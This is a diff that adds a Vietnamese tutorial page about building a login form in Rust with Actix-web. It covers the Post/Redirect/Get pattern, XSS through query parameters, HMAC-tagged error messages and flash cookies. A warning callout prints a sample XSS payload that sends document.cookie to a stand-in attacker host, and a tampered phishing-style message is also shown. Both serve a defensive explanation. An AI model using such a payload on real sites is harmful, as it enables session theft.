@@ -1,0 +1,199 @@
+---
+title: "10.5 - 10.6 Xử Lý Form Đăng Nhập & Phục Vụ Trang HTML"
+description: "Phục vụ giao diện HTML với Actix-web, xử lý luồng đăng nhập Post/Redirect/Get, phòng chống tấn công XSS và bảo vệ thông báo lỗi bằng HMAC Tag cùng Flash Cookies."
+---
+
+import { Callout } from "fumadocs-ui/components/callout";
+
+# 10.5 - 10.6 Xử Lý Form Đăng Nhập & Phục Vụ Trang HTML
+
+Basic Authentication là giải pháp tuyệt vời cho giao tiếp giữa các máy chủ (Machine-to-Machine API). Tuy nhiên, đối với tác giả blog — một con người bằng xương bằng thịt sử dụng trình duyệt web — chúng ta cần cung cấp một giao diện đăng nhập đồ họa thân thiện: một **Trang đăng nhập HTML (Login Form)**.
+
+---
+
+## I. Phục Vụ Trang HTML Bằng Actix-web (Serving HTML Pages)
+
+Để hiển thị trang đăng nhập, ta tạo một endpoint `GET /login`. Handler này sẽ trả về một chuỗi mã HTML với header `Content-Type: text/html; charset=utf-8`:
+
+Tạo module `src/routes/login/get.rs`:
+
+```rust
+//! src/routes/login/get.rs
+use actix_web::http::header::ContentType;
+use actix_web::HttpResponse;
+
+pub async fn login_form() -> HttpResponse {
+    HttpResponse::Ok()
+        .content_type(ContentType::html())
+        .body(
+            r#"<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Login</title>
+</head>
+<body>
+    <form action="/login" method="post">
+        <label>Username
+            <input
+                type="text"
+                placeholder="Enter Username"
+                name="username"
+            >
+        </label>
+        <label>Password
+            <input
+                type="password"
+                placeholder="Enter Password"
+                name="password"
+            >
+        </label>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>"#,
+        )
+}
+```
+
+Đăng ký route mới vào ứng dụng trong `src/startup.rs`:
+
+```rust
+//! src/startup.rs
+use crate::routes::{login_form, publish_newsletter};
+
+// [...]
+App::new()
+    .route("/login", web::get().to(login_form))
+    // [...]
+```
+
+---
+
+## II. Xử Lý Dữ Liệu Form Đăng Nhập (Processing Form Data)
+
+Khi người dùng nhấn nút "Login", trình duyệt sẽ đóng gói dữ liệu hai ô input thành định dạng `application/x-www-form-urlencoded` và gửi một request `POST /login`.
+
+Chúng ta tạo struct hứng dữ liệu với `serde::Deserialize` và dùng kiểu `Secret<String>` từ crate `secrecy` để bảo vệ mật khẩu không bị in vô tình ra log:
+
+```rust
+//! src/routes/login/post.rs
+use actix_web::{web, HttpResponse};
+use secrecy::Secret;
+
+#[derive(serde::Deserialize)]
+pub struct FormData {
+    username: String,
+    password: Secret<String>,
+}
+
+#[tracing::instrument(
+    skip(form, pool),
+    fields(username=tracing::field::Empty, user_id=tracing::field::Empty)
+)]
+pub async fn login(
+    form: web::Form<FormData>,
+    pool: web::Data<PgPool>,
+) -> Result<HttpResponse, InternalError<LoginError>> {
+    let credentials = Credentials {
+        username: form.0.username,
+        password: form.0.password,
+    };
+    
+    // Ghi lại username vào span (loại trừ password)
+    tracing::Span::current().record("username", &tracing::field::display(&credentials.username));
+
+    match validate_credentials(credentials, &pool).await {
+        Ok(user_id) => {
+            tracing::Span::current().record("user_id", &tracing::field::display(&user_id));
+            Ok(HttpResponse::SeeOther()
+                .insert_header((actix_web::http::header::LOCATION, "/admin/dashboard"))
+                .finish())
+        }
+        Err(e) => {
+            // Xử lý khi đăng nhập thất bại
+            // [...]
+        }
+    }
+}
+```
+
+### Mô hình Post/Redirect/Get và Mã HTTP 303 See Other
+
+Khi đăng nhập thành công, server không nên trả về trực tiếp nội dung trang Dashboard bằng mã 200 OK. Nếu làm vậy, khi người dùng nhấn F5 (Refresh) trên trình duyệt, trình duyệt sẽ cảnh báo và gửi lại request POST trước đó.
+
+Quy chuẩn thiết kế web chuẩn mực là **Post/Redirect/Get Pattern**:
+- Sau khi xử lý request `POST` thành công, server trả về mã chuyển hướng **HTTP 303 See Other** kèm theo header `Location: /admin/dashboard`.
+- Trình duyệt tự động chuyển hướng và thực hiện một request `GET /admin/dashboard`. Giờ đây người dùng có thể thoải mái F5 mà không sợ gửi lại form đăng nhập.
+
+---
+
+## III. Hiển Thị Thông Báo Lỗi Ngữ Cảnh (Contextual Errors)
+
+Khi đăng nhập thất bại, chúng ta muốn đưa người dùng quay lại trang `/login` và hiển thị một dòng thông báo màu đỏ: *"Tên đăng nhập hoặc mật khẩu không chính xác"*. 
+
+Làm thế nào để truyền thông điệp lỗi này một cách an toàn?
+
+### 1. Hiểm họa Cross-Site Scripting (XSS) từ Query Parameters
+
+Cách tiếp cận ngây thơ đầu tiên là đính kèm thông báo lỗi vào Query Parameter khi chuyển hướng:
+```text
+Location: /login?error=Invalid%20credentials
+```
+
+Khi trang `/login` render, nó đọc tham số `error` từ URL và in trực tiếp vào HTML:
+```html
+<p><i>{{ error }}</i></p>
+```
+
+<Callout type="warn" title="Lỗ hổng Cross-Site Scripting (XSS)">
+Nếu một kẻ tấn công gửi cho người dùng một đường link độc hại:
+`/login?error=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
+Trình duyệt của nạn nhân sẽ tải trang, đọc chuỗi script độc hại và thực thi mã JavaScript đó ngay trên miền của bạn! Toàn bộ cookie và phiên làm việc của người dùng sẽ bị đánh cắp hoàn toàn.
+</Callout>
+
+**Giải pháp**: Bắt buộc phải mã hóa các ký tự đặc biệt trong HTML (**HTML Escaping**) hoặc từ chối mọi chuỗi văn bản tự do truyền qua URL.
+
+### 2. Chống giả mạo thông điệp với mã HMAC (Message Authentication Codes)
+
+Kể cả khi đã escape HTML, kẻ tấn công vẫn có thể chỉnh sửa query parameter để tạo ra các thông điệp đánh lừa người dùng:
+`/login?error=He%20thong%20dang%20bao%20tri,%20vui%20long%20gui%20mat%20khau%20ve%20email%20admin@hacker.com`.
+
+Để đảm bảo thông điệp lỗi thực sự do chính máy chủ của chúng ta sinh ra và **chưa hề bị can thiệp sửa đổi (tampered)**, chúng ta sử dụng thuật toán **HMAC (Hash-based Message Authentication Code)** kết hợp hàm băm SHA-256:
+
+```text
+/login?error=Invalid%20credentials&tag=5a7f9b8c2d...
+```
+
+- Server nắm giữ một bí mật chung (**Secret Key**).
+- Khi tạo chuyển hướng lỗi, server tính mã tag: `tag = HMAC_SHA256(error_message, secret_key)`.
+- Khi trang `/login` nhận request, nó tính lại mã tag từ `error` và so sánh với `tag` trên URL. Nếu không khớp, server biết ngay thông điệp đã bị kẻ xấu chỉnh sửa và từ chối hiển thị!
+
+---
+
+## IV. Thông Báo Lỗi Phải Có Tính Chớp Nhoáng (Flash Messages)
+
+Ngay cả khi dùng HMAC, giải pháp qua URL vẫn còn một nhược điểm khó chịu:
+Nếu người dùng đăng nhập sai, thấy thông báo lỗi, rồi sau đó F5 lại trang `/login`, thông báo lỗi đó **vẫn tiếp tục hiển thị mãi mãi** vì tham số `?error=...` vẫn nằm nguyên trên thanh địa chỉ!
+
+Thông báo lỗi đăng nhập phải là một **Thông báo chớp nhoáng (Ephemeral / Flash Message)**: *Nó chỉ được hiển thị đúng một lần duy nhất, và biến mất ngay lập tức ở lần tải trang tiếp theo*.
+
+### Cơ chế hoạt động của HTTP Cookies
+
+Để làm được điều này, chúng ta sử dụng **Cookie**:
+
+```text
+[POST /login] ──► Server trả về: Set-Cookie: _flash=Invalid%20credentials; HttpOnly; SameSite=Lax
+                      │
+[GET /login]  ◄── Trình duyệt gửi: Cookie: _flash=Invalid%20credentials
+                      │
+              Server render thông báo lỗi và gửi kèm:
+              Set-Cookie: _flash=; Max-Age=0 (Xóa cookie ngay lập tức!)
+```
+
+Các thuộc tính bảo mật bắt buộc của Cookie:
+- **`HttpOnly`**: Ngăn chặn tuyệt đối các đoạn mã JavaScript chạy trên trình duyệt truy cập vào cookie qua `document.cookie` (vô hiệu hóa triệt để đánh cắp session qua XSS).
+- **`SameSite=Lax` / `Strict`**: Ngăn trình duyệt tự động gửi cookie trong các request bắt nguồn từ trang web bên ngoài, triệt tiêu tấn công **CSRF (Cross-Site Request Forgery)**.
+- **`Secure`**: Chỉ gửi cookie qua các kết nối được mã hóa TLS (HTTPS).
+
+Trong thực tế, thay vì quản lý vòng đời cookie thủ công, chúng ta sử dụng crate chuyên dụng [`actix-web-flash-messages`](https://crates.io/crates/actix-web-flash-messages) tích hợp cùng Actix-web để tự động hóa toàn bộ quy trình ký HMAC và xóa cookie chớp nhoáng sau khi hiển thị.
